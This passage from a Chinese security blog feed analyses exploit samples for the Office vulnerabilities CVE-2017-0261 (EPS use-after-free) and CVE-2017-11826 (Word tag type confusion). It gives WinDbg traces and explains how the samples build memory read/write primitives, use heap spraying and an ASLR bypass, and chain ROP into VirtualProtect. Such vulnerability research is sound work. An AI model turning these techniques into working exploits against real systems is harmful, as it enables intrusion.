0049e2e0  0049dc40 0048f198 12d8568f 80000000
0049e2f0  00490023 000007c8 00000300 00000100
0049e300  12d856b2 8000f19c 00000026 00000100
0049e310  0049dc60 0048f1a0 12d856b1 80000100
0049e320  00420029 0048f1a4 00000003 00000000
0049e330  12d856b4 80000080 0000002c 00000100
0:000&gt; db poi(poi(poi(poi(poi( 0049e2c0 +c))+24))+20) L10   //查看字符串的内容为l56 cvx exec
00495940  20 6c 35 36 20 63 76 78-20 65 78 65 63 20 00 00   l56 cvx exec ..
0:000&gt; g        //第二次执行deferred_exec
(5c8.144): C++ EH exception - code e06d7363 (first chance)
(5c8.144): C++ EH exception - code e06d7363 (first chance)
Breakpoint 1 hit
eax=0018fd78 ebx=00000000 ecx=00291280 edx=00000003 esi=00425770 edi=00000001
eip=718fba06 esp=0018fd54 ebp=0018fdbc iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
EPSIMP32!RegisterPercentCallback+0x4604:
718fba06 e8d8abffff      call    EPSIMP32+0x265e3 (718f65e3)
0:000&gt; dd poi(poi(poi(poi(poi( 0018fd78 +c))+24))+28)   //查看数组的内容
0049e2c0  00000500 00000100 00495438 0048eeac			//数组中存放着字符串对象
0049e2d0  12d85688 8000f194 00000020 00000100
0049e2e0  0049dc40 0048f198 12d8568f 80000000
0049e2f0  00490023 000007c8 00000300 00000100
0049e300  12d856b2 8000f19c 00000026 00000100
0049e310  0049dc60 0048f1a0 12d856b1 80000100
0049e320  00420029 0048f1a4 00000003 00000000
0049e330  12d856b4 80000080 0000002c 00000100
0:000&gt; db poi(poi(poi(poi(poi( 0049e2c0 +c))+24))+20) L10   //查看字符串的内容为l53 cvx exec
00495958  20 6c 35 33 20 63 76 78-20 65 78 65 63 20 00 00   l53 cvx exec ..
</code></pre></div></div>

<p>从调试的结果可以得知，该函数执行的正是forall。在第一次执行时，l61中待执行的命令是<code class="language-plaintext highlighter-rouge">l56 cvx exec</code>，在第二次执行时，l61中的内容已经被换成了<code class="language-plaintext highlighter-rouge">l53 cvx exec</code>与调试结果相符。</p>

<p>接着深入函数分析，发现函数内部嵌套了deferred_exec：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210901193647205.png" alt="image-20210901193647205" /></p>

<p>于是重新调试，下断在此，分析参数：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210901201303745.png" alt="image-20210901201303745" /></p>

<p>虽然type为0x10的操作符对象存储在Systemdict中无法查看，但是通过其他字符和数字还是能够确定该语句就是l50。当执行该语句后，原本l63指向的string结构将被替换成存放l52内容的string结构：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210901211439785.png" alt="image-20210901211439785" /></p>

<p>可以看到此时原本存放l63的string结构已经变成了l52。</p>

<p>在get函数下断，跳转到forall下的<code class="language-plaintext highlighter-rouge">/l64 l57 56 get def</code>语句查看l57的值：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210903144034585.png" alt="image-20210903144034585" /></p>

<p>可以证实l57中存放的就是从l63中获取到的字符，该forall的作用就是泄露被释放的string结构指向的字符串。</p>

<p>接着获取l57中的值，并进行一些处理，通过ifelse判断系统位数，若l77等于l52的长度+1，那么l99的值为1代表系统为64位，否则l99为0，代表系统为32位：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210903164816672.png" alt="image-20210903164816672" /></p>

<p>可以看到在32位的调试环境下，l77的值为0，因此会将5个0压入操作栈中，并赋值给l95到l99：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210903165138520.png" alt="image-20210903165138520" /></p>

<p>至此，漏洞原理部分分析完毕，接下来分析漏洞利用部分。</p>

<h1 id="漏洞利用">漏洞利用</h1>

<p>第二次执行forall代码如下：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210903171728048.png" alt="image-20210903171728048" /></p>

<p>和第一次执行十分类似，因此就不深入分析。查看执行完forall后stringl63的变化：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210904155018524.png" alt="image-20210904155018524" /></p>

<p>查看l63中的值，发现是一个string结构，于是查看字符串，内容正是l102中存储的l36的字符串</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210904155250267.png" alt="image-20210904155250267" /></p>

<p>接着通过<code class="language-plaintext highlighter-rouge">l90 0 l92 putinterval</code>将l63中指向的第一个4字节的内容改为0x02b14ad4，该值指向l36中四字节之后的内容</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210904161420028.png" alt="image-20210904161420028" /></p>

<p>经过多次修改，字符串修改为如下状态，修改的值会在第三次漏洞触发时使用到：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210907120914829.png" alt="image-20210907120914829" /></p>

<p>接着查看l137获取的是l63中0x4处的值，l138获取的是l63中0x20处的值，l103的值为1</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210904170623340.png" alt="image-20210904170623340" /></p>

<p>第二次漏洞触发部分分析完毕，接下分析第三次漏洞触发构造读写原语的部分。</p>

<h2 id="构造读写原语">构造读写原语</h2>

<p>l142中存储的是将l138放入到l193的0x24位置的后的字符串：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210904185419955.png" alt="image-20210904185419955" /></p>

<p>接着使用forall操作符遍历l63数组，当遍历到第54个元素时，恢复快照。此时array l63被释放，接着复制 l142字符串，使得array l63对象被l142字符串对象覆盖：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210906105724780.png" alt="image-20210906105724780" /></p>

<p>此时查看被覆盖后的l63中最后一次会被获取的值：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210906111515943.png" alt="image-20210906111515943" /></p>

<p>说明最后一次会获取一个array对象，继续深入查看该对象发现存储了一个字符串，该字符串起始地址为0x00000000，大小为0x7fffffff：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210906112556232.png" alt="image-20210906112556232" /></p>

<p>通过该字符串，可读写内存中0x00000000-0x7fffffff的任意地址，实现了读写原语的构造，最终将字符串对象存储在l201中。</p>

<h2 id="构建rop链">构建ROP链</h2>

<p>通过字符串l201获取EPSIMP32的基地址为：0x74750000，并存入l314中：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210906151059868.png" alt="image-20210906151059868" /></p>

<p>接着通过EPSIMP32的导入表获取kernel32.dll的基地址并存放于l315中：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210906162228059.png" alt="image-20210906162228059" /></p>

<p>随后开始利用读写原语搜索内存中的gadget用于构造ROP链：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210906164333935.png" alt="image-20210906164333935" /></p>

<p>将构造好的ROP链放入伪造的文件对象中，并将对象放置在l159的2号元素中，将恶意pe文件和shellcode组成的字符串放置在l159的3号元素中：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210906200817931.png" alt="image-20210906200817931" /></p>

<p>最终调用closefile操作符关闭伪造的文件对象，在关闭过程中会执行<code class="language-plaintext highlighter-rouge">call [eax+8]</code>使得跳转到构造好的ROP链中：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210906201456526.png" alt="image-20210906201456526" /></p>

<p>至此，整个漏洞的原理和利用分析完毕，剩下的行为部分不再分析。</p>

<h1 id="总结">总结</h1>

<p>该样本漏洞利用的十分巧妙，通过UAF将原本正常的数组对象替换为指向构造好的能够读写任意内存的字符串对象。通过字符串对象实现了读写任意内存并构造ROP链的目的，并最终将构造好的ROP字符串对象修改为文件对象，利用cloasefile操作符跳转到ROP链中。</p>

<p>尽管微软已经关闭了Office对于EPS文件的支持，但该格式文件仍然能被Adobe Illustrator打开，如果深入研究该类型文件可能仍有出现漏洞的可能。</p>

<h1 id="参考链接">参考链接</h1>

<p>[1] <a href="https://www.adobe.com/content/dam/acom/en/devnet/actionscript/articles/PLRM.pdf">PostScript LANGUAGE REFERENCE</a></p>

<p>[2] <a href="https://github.com/kcufId/eps-CVE-2017-0261">eps-CVE-2017-0261</a></p>

<p>[3] <a href="https://bbs.pediy.com/thread-261442.htm">CVE-2017-0261及利用样本分析</a></p>

<p>[4] <a href="https://www.fireeye.com/blog/threat-research/2017/05/eps-processing-zero-days.html">EPS Processing Zero-Days Exploited by Multiple Threat Actors</a></p>]]></content><author><name>Joey</name></author><category term="漏洞分析" /><summary type="html"><![CDATA[前言 第一次分析EPS类漏洞，对于PostScript格式十分陌生，通过查阅PostScript LANGUAGE REFERENCE了解PostScript格式。调试EXP来自kcufld师傅的eps-CVE-2017-0261，EXP在Office 2007可以正常运行，但在Office 2010以上版本需要配合提权漏洞逃逸沙箱后完成利用。]]></summary></entry><entry><title type="html">CVE-2017-11826 漏洞分析及利用</title><link href="http://localhost:4000/2021-08-04/CVE-2017-11826" rel="alternate" type="text/html" title="CVE-2017-11826 漏洞分析及利用" /><published>2021-08-04T00:00:00+08:00</published><updated>2021-08-04T00:00:00+08:00</updated><id>http://localhost:4000/2021-08-04/CVE-2017-11826</id><content type="html" xml:base="http://localhost:4000/2021-08-04/CVE-2017-11826"><![CDATA[<h1 id="前言">前言</h1>

<p>最近开始分析Office漏洞，拿到CVE-2017-11826的样本后发现无法在Office2010上成功执行，打算分析并改造该EXP。参考了许多资料，结合自己的理解写了本文，供大家学习和参考。<!--more--></p>

<h1 id="漏洞分析">漏洞分析</h1>

<h2 id="分析环境">分析环境</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>OS:			Win7 x64 SP1
Office:		    	Ofiice 2010 x86
Image name: 		wwlib.dll
Timestamp:      	Sat Mar 27 23:37:07 2010 (4BAE2623)
CheckSum:       	0127F568
ImageSize:      	0127A000
File version:   	14.0.4762.1000
Product version:	14.0.4762.0
</code></pre></div></div>

<h2 id="静态分析">静态分析</h2>

<p>在rtf文档中搜索object，发现嵌入了3个ole对象：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210727171412503.png" alt="image-20210727171412503" /></p>

<p>第一个对象的CLSID为<code class="language-plaintext highlighter-rouge">D5DE8D20-5BB8-11D1-A1E3-00A0C90F2731</code>，在注册表搜索后发现该对象位于<code class="language-plaintext highlighter-rouge">C:\Windows\SysWOW64\msvbvm60.dll</code>，而该dll是没有ASLR的。</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210727175112215.png" alt="image-20210727175112215" /></p>

<p>通过ProcessExplorer发现word打开rtf文档后确实加载了msvbvm60.dll，且该dll无ASLR，说明该ole对象的作用是绕过ASLR。</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210727180558328.png" alt="image-20210727180558328" /></p>

<p>使用<code class="language-plaintext highlighter-rouge">rtfobj.py -s all</code>提取ole对象：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210727165632756.png" alt="image-20210727165632756" /></p>

<p>第一个对象经过上面的分析是用于绕过ASLR的，第二和第三个都是.doc文档，使用压缩软件直接打开第二个文档，文档结构如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>│  [Content_Types].xml
│  
├─docProps
│      app.xml
│      core.xml
│      
├─word
│  │  document.xml
│  │  fontTable.xml
│  │  settings.xml
│  │  styles.xml
│  │  webSettings.xml
│  │  
│  ├─activeX
│  │  │  activeX1.bin
│  │  │  activeX1.xml
│  │  │  activeX2.xml
│  │  │  	······
│  │  │  activeX40.xml
│  │  │  
│  │  └─_rels
│  │          activeX1.xml.rels
│  │          activeX2.xml.rels
│  │          		······
│  │          activeX40.xml.rels
│  │          
│  ├─media
│  │      image1.wmf
│  │      
│  ├─theme
│  │      theme1.xml
│  │      
│  └─_rels
│          document.xml.rels
│          
└─_rels
        .rels
</code></pre></div></div>

<p>可以看出使用了40个activeX.xml文件，文件内容如下：</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span>
<span class="nt">&lt;ax:ocx</span> <span class="na">ax:classid=</span><span class="s">"{00000000-0000-0000-0000-000000000001}"</span> <span class="na">ax:persistence=</span><span class="s">"persistStorage"</span> <span class="na">r:id=</span><span class="s">"rId1"</span> <span class="na">xmlns:ax=</span><span class="s">"http://schemas.microsoft.com/office/2006/activeX"</span> <span class="na">xmlns:r=</span><span class="s">"http://schemas.openxmlformats.org/officeDocument/2006/relationships"</span><span class="nt">/&gt;</span>
</code></pre></div></div>

<p>40个xml文件内容一致，加载了CLSID为{00000000-0000-0000-0000-000000000001}的对象，然而系统中并没有这个对象，所以并不会加载任何对象，这么做是为了提高堆喷的效率，具体原理可查看<a href="https://www.greyhathacker.net/?p=911">SPRAYING THE HEAP IN SECONDS USING ACTIVEX CONTROLS IN MICROSOFT OFFICE</a>一文。</p>

<p>而40个activeX.xml.rels的内容也完全一致：</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;</span>
<span class="nt">&lt;Relationships</span> <span class="na">xmlns=</span><span class="s">"http://schemas.openxmlformats.org/package/2006/relationships"</span><span class="nt">&gt;</span>
	<span class="nt">&lt;Relationship</span> <span class="na">Id=</span><span class="s">"rId1"</span> <span class="na">Type=</span><span class="s">"http://schemas.microsoft.com/office/2006/relationships/activeXControlBinary"</span> <span class="na">Target=</span><span class="s">"activeX1.bin"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/Relationships&gt;</span>
</code></pre></div></div>

<p>都指向了activeX1.bin文件，因此会将activeX1.bin在内存中加载40次，以此达到堆喷的目的。</p>

<p>activeX1.bin文件结构如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>activeX1.bin
│ -文件头 
│ -数据
│    │---CB 40 94 72 EC 83 88 08 CB 40 94 72 EC 83 88 08
│    │						······
│    │---CB 40 94 72 EC 83 88 08 CB 40 94 72 EC 83 88 08
|    |
│    │---shellcode ······
|    |
│    │---2B 0E 98 72 2B 0E 98 72 2B 0E 98 72 2B 0E 98 72
│    │						······
│    │---2B 0E 98 72 2B 0E 98 72 2B 0E 98 72 2B 0E 98 72
│    │						······
│    │---CB 40 94 72 EC 83 88 08 CB 40 94 72 EC 83 88 08
│    │						······

</code></pre></div></div>

<p>看结构似乎是滑板指令加shellcode，待调试验证。</p>

<p>第三个文档结构如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>│  [Content_Types].xml
│  
├─docProps
│      app.xml
│      core.xml
│      
├─word
│  │  document.xml
│  │  endnotes.xml
│  │  fontTable.xml
│  │  footnotes.xml
│  │  settings.xml
│  │  styles.xml
│  │  webSettings.xml
│  │  
│  ├─theme
│  │      theme1.xml
│  │      
│  └─_rels
│          document.xml.rels
│          
└─_rels
        .rels
</code></pre></div></div>

<p>document.xml的内容如下：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804144955166.png" alt="image-20210804144955166" /></p>

<p>观测到&lt;w:font 标签内有异常字符，且标签未正常闭合，预测漏洞触发于该处。</p>

<p>通过静态分析了解到RTF文档通过内嵌3个ole对象来实现ASLR绕过、堆喷射和漏洞触发，ASLR绕过是通过加载CLSID为<code class="language-plaintext highlighter-rouge">D5DE8D20-5BB8-11D1-A1E3-00A0C90F2731</code>的COM对象，将<code class="language-plaintext highlighter-rouge">msvbvm60.dll</code>加载到内存中。堆喷射利用40个activeX.xml.rels指向唯一的activeX1.bin文件，将activeX1.bin文件中的数据部分，即偏移为0x800后的内容加载到内存中实现堆喷射。而漏洞触发部分则利用document.xml中的异常字符和标签触发漏洞。</p>

<h3 id="动态调试">动态调试</h3>

<p>使用windbg附加word，打开漏洞文件：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210727162527153.png" alt="image-20210727162527153" /></p>

<p>可以看到异常因为ecx+4指向的内存无法访问导致错误。查看反汇编得知ecx的值来源于eax，此时eax的值为<code class="language-plaintext highlighter-rouge">088888ec</code>。再次打开漏洞文件发现ecx的值改变，但是eax的值仍为<code class="language-plaintext highlighter-rouge">088888ec</code>，说明eax的值为故意构造。</p>

<p>于是打算下断在函数<code class="language-plaintext highlighter-rouge">wwlib!DllGetClassObject+0x42d4 (71ed98b0)</code>查看eax是如何生成的。查看wwlib的基地址，算出函数的偏移为<code class="language-plaintext highlighter-rouge">wwlib+004da16b</code>。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0:000&gt; lm m wwlib
start    end        module name
71ed0000 7314a000   wwlib      (export symbols)       C:\PROGRA~2\MICROS~1\Office14\wwlib.dll
0:000&gt; ? 723aa16b-71ed0000
Evaluate expression: 5087595 = 004da16b
</code></pre></div></div>

<p>重新打开漏洞文档，<code class="language-plaintext highlighter-rouge">bp wwlib+004da16b</code>下断：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802112402518.png" alt="image-20210802112402518" /></p>

<p>步过两次后执行到如图所示位置时，查看eax所在的内存：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802112612050.png" alt="image-20210802112612050" /></p>

<p>发现和在文档3中的字符串一致，接着查看eax+44，对应的正是异常触发时eax的值<code class="language-plaintext highlighter-rouge">088888ec</code>。</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802112936829.png" alt="image-20210802112936829" /></p>

<p>但在xml文件中，字符串中的异常字符的十六进制为<code class="language-plaintext highlighter-rouge">e8a3ace0a288</code>：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802140720647.png" alt="image-20210802140720647" /></p>

<p>在文件中显示的格式是Ascii，然而在内存中显示的是Unicode，于是将文件中的字符以utf-8格式转换为十六进制正是eax的值<code class="language-plaintext highlighter-rouge">088888ec</code>：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802142105409.png" alt="image-20210802142105409" /></p>

<p>说明通过修改该字符串可以控制eax的值，进而控制eip。</p>

<p>在ida中找到奔溃函数为sub_31A55CE6，发现变量v3是宽字节字符串，位于arg2+0x18，变量v4是一个长度，位于arg2+0x1c</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802153650508.png" alt="image-20210802153650508" /></p>

<p>在windbg设置崩溃函数起始点打印v3为字符串，长度为v4：<code class="language-plaintext highlighter-rouge">bp wwlib+385ce6 "du poi(poi(esp+8)+18) Lpoi(poi(esp+8)+1c); g;"</code></p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802161250939.png" alt="image-20210802161250939" /></p>

<p>可以看到v3就是xml文件中的标签，在解析到idmp标签后程序崩溃，然而并没有看到font标签，于是寻找到崩溃函数的父函数sub_3170FA5A</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802163044663.png" alt="image-20210802163044663" /></p>

<p>崩溃函数arg2的值为edi，而edi的值为父函数的arg2：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802165001758.png" alt="image-20210802165001758" /></p>

<p>于是在父函数和崩溃函数同时下断，查看标签解析情况：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bp wwlib+3fa5a ".printf \"Parent_Func:	\"; du poi(poi(esp+8)+18) Lpoi(poi(esp+8)+1c); g;"
bp wwlib+385ce6 ".printf \"Crash_Func:	\"; du poi(poi(esp+8)+18) Lpoi(poi(esp+8)+1c); g;"
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802170632918.png" alt="image-20210802170632918" /></p>

<p>在父函数成功解析到font标签，猜测因为font标签未闭合而导致崩溃函数解析标签出错产生漏洞，修改了xml文件闭合了font标签：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804145041151.png" alt="image-20210804145041151" /></p>

<p>将修改后的docx文件嵌入到新建的rtf文件中，在windbg中调试后发现eax的值改变了，并且没有异常，证实因为font标签未闭合导致的漏洞。</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210802180616278.png" alt="image-20210802180616278" /></p>

<p>继续调试发现异常触发点的eax和ecx都是来自于esi，而esi为漏洞函数的arg1：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803145832128.png" alt="image-20210803145832128" /></p>

<p>因此在漏洞函数打印标签以及[[esi+17f0]]、[[esi+17f0]+8]、[[esi+17f0]+c]和[esi+17f0]的值：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bp wwlib+385ce6 "du poi(poi(esp+8)+18) Lpoi(poi(esp+8)+1c); r $t0=poi(poi(esp+4)+17f0); dd poi($t0) L1; dd poi($t0)+8 L1; dd poi($t0)+c L1; dd $t0 L1; .printf\"\\n\"; g;"
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803162436403.png" alt="image-20210803162436403" /></p>

<p>打印出的结构就是Taglist结构体，具体结构参考goabout2的<a href="https://www.cnblogs.com/goabout2/p/8186018.html">office CVE-2017-11826杂谈</a>一文。</p>

<p>接着调试异常触发点上的函数，发现函数功能为通过层级标签获取TagObject Array[Index-2]：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803192637477.png" alt="image-20210803192637477" /></p>

<p>继续向上追溯，发现函数GetTagObject也调用了GetTagObjectByIndex，通过分析发现该函数获取的是TagObject Array[Index-1]的地址：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803193709068.png" alt="image-20210803193709068" /></p>

<p>分析到这里，漏洞产生的原因也就出来了，由于word每解析一个标签，Current_Index的值就加一，当解析到闭合标签，Current_Index值会减1。由于构造了没有闭合的font标签，因此导致在解析idmap标签时比正常文件的Current_Index多一，导致原本应该获取OLEObject标签的TagObject变成获取了font的TagObject，因此造成了标签类型混淆导致漏洞的发生。</p>

<p>将标签层级和xml文件标签对应：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803164645125.png" alt="image-20210803164645125" /></p>

<p>可以证实确实因为Current_Index值比正常文件的多一导致的类型混淆。</p>

<p>在内存中查看当解析idmap层级为6时Taglist的内存结构：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; bp wwlib+4da16b
&gt; g
Breakpoint 1 hit
eax=070f1800 ebx=00000000 ecx=0225466c edx=00000004 esi=0225466c edi=070f19dc
eip=6f95a16b esp=002cf428 ebp=002cf490 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
wwlib!DllGetLCID+0x2cc775:
6f95a16b e840f7b2ff      call    wwlib!DllGetClassObject+0x42d4 (6f4898b0)
&gt; ub $ip L8
wwlib!DllGetLCID+0x2cc75d:
6f95a153 83780401        cmp     dword ptr [eax+4],1
6f95a157 0f85f5bdeaff    jne     wwlib!DllGetLCID+0x17855c (6f805f52)
6f95a15d 8bb6f0170000    mov     esi,dword ptr [esi+17F0h]
6f95a163 8b06            mov     eax,dword ptr [esi]
6f95a165 8b10            mov     edx,dword ptr [eax]
6f95a167 4a              dec     edx
6f95a168 4a              dec     edx
6f95a169 8bce            mov     ecx,esi
</code></pre></div></div>

<p>此时eax的值即为Taglist，因此查看eax指向的Taglist结构：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803215207578.png" alt="image-20210803215207578" /></p>

<p>此时TagObject[4]+0x44的值为<code class="language-plaintext highlighter-rouge">0x090b4000</code>，查看该值在内存中存储的数据：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803213913808.png" alt="image-20210803213913808" /></p>

<p>发现[[TagObject[4]+0x44]+0x44]的值正是xml文件中font标签构造的固定地址，自此漏洞部分分析完毕。</p>

<h2 id="漏洞利用">漏洞利用</h2>

<p>先启动word然后使用windbg附加会导致堆喷无法成功，继而无法分析漏洞利用部分。因此使用gflags.exe让调试器直接加载winword.exe：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803220115994.png" alt="image-20210803220115994" /></p>

<p>设置断点在异常触发点：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; bp wwlib+4da184
&gt; g
Breakpoint 0 hit
eax=088888ec ebx=00000000 ecx=088883ec edx=00000004 esi=004b44b4 edi=0340cddc
eip=6e2da184 esp=002f5f14 ebp=002f5f7c iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
wwlib!DllGetLCID+0x2cc78e:
6e2da184 50              push    eax
0:000&gt; u $ip
wwlib!DllGetLCID+0x2cc78e:
6e2da184 50              push    eax
6e2da185 ff5104          call    dword ptr [ecx+4]
6e2da188 e9fabdeaff      jmp     wwlib!DllGetLCID+0x178591 (6e185f87)
6e2da18d 83f802          cmp     eax,2
6e2da190 750f            jne     wwlib!DllGetLCID+0x2cc7ab (6e2da1a1)
6e2da192 83c624          add     esi,24h
6e2da195 56              push    esi
6e2da196 52              push    edx
&gt; dd ecx+4
088883f0  72980e2b 72980e2b 72980e2b 72980e2b
08888400  72980e2b 72980e2b 72980e2b 72980e2b
08888410  72980e2b 72980e2b 72980e2b 72980e2b
08888420  72980e2b 72980e2b 72980e2b 72980e2b
08888430  72980e2b 72980e2b 72980e2b 72980e2b
08888440  72980e2b 72980e2b 72980e2b 72980e2b
08888450  72980e2b 72980e2b 72980e2b 72980e2b
08888460  72980e2b 72980e2b 72980e2b 72980e2b
</code></pre></div></div>

<p>发现exc+4的值为activeX1.bin中shellcode下方的填充，说明已经成功堆喷。</p>

<p>步入[exc+4]后发现来到了msvbvm60.dll，已经进入了ROP链：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&gt; t
eax=088888ec ebx=00000000 ecx=088883ec edx=00000004 esi=004c44b4 edi=0043cddc
eip=72980e2b esp=00385a18 ebp=00385a88 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
msvbvm60!IID_IVbaHost+0x127eb:
72980e2b 94              xchg    eax,esp
</code></pre></div></div>

<p>而第一条指令则是用来栈迁移，在之前已经将eax入栈，而eax的值正是构造好的<code class="language-plaintext highlighter-rouge">0x088888ec</code>，执行指令后，esp的值已经变成了<code class="language-plaintext highlighter-rouge">0x088888ec</code>：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210803223544350.png" alt="image-20210803223544350" /></p>

<p>而eax中的内容刚好位于shellcode的上方，此时ROP链为滑板指令，循环执行<code class="language-plaintext highlighter-rouge">pop eax</code>和<code class="language-plaintext highlighter-rouge">ret</code>，此时可以下断<code class="language-plaintext highlighter-rouge">bp 729440cc ".if(esp=08888f48){}.else{gc}"</code>停在了滑板指令结束的位置：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804102057063.png" alt="image-20210804102057063" /></p>

<p>当执行到最后一次滑板指令时，会将<code class="language-plaintext highlighter-rouge">0x729410d0</code>放入eax中，而该值是msvbvm60.dll的IAT表中的数据，查看后存储的是VirtualProtect的地址：</p>

<p><img src="https://raw.githubusercontent.com/JoeyZzZzZz/JoeyZzZzZz.github.io/main/image/image-20210804103009190.png" alt="image-20210804103009190" /></p>

<p>紧接着通过ret跳转到ROP指令<code class="language-plaintext highlighter-rouge">jmp [eax]</code>执行VirtualProtect，而此时栈中为构造好的VirtualProtect的参数：</p>

